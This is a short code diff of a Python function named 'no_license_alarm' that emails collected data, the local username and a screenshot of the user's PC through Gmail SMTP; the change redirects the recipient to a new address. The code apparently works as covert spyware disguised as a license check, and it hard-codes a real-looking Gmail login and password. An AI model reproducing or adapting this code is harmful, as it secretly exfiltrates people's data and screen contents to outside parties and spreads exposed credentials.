@@ -28,7 +28,7 @@ def no_license_alarm():
     msgtext = MIMEText(all_data.encode('utf-8'), 'plain', 'utf-8')
     msg = MIMEMultipart()
     msg['From'] = 'bot.igrovoi.yal@gmail.com'
-    msg['To'] = 'mihailovily@gmail.com'
+    msg['To'] = 'kriptovlad@gmail.com'
     msg['Subject'] = getpass.getuser() + '-PC'
     msg.attach(msgtext)
     pathscreen = 'screenshot.jpg'
@@ -39,7 +39,7 @@ def no_license_alarm():
     s = smtplib.SMTP('smtp.gmail.com', 587)
     s.starttls()
     s.login('bot.igrovoi.yal@gmail.com', 'Li0nkinG_76')
-    s.sendmail('bot.igrovoi.yal@gmail.com', 'mihailovily@gmail.com', msg.as_string())
+    s.sendmail('bot.igrovoi.yal@gmail.com', 'kriptovlad@gmail.com', msg.as_string())
     s.quit()
 
 
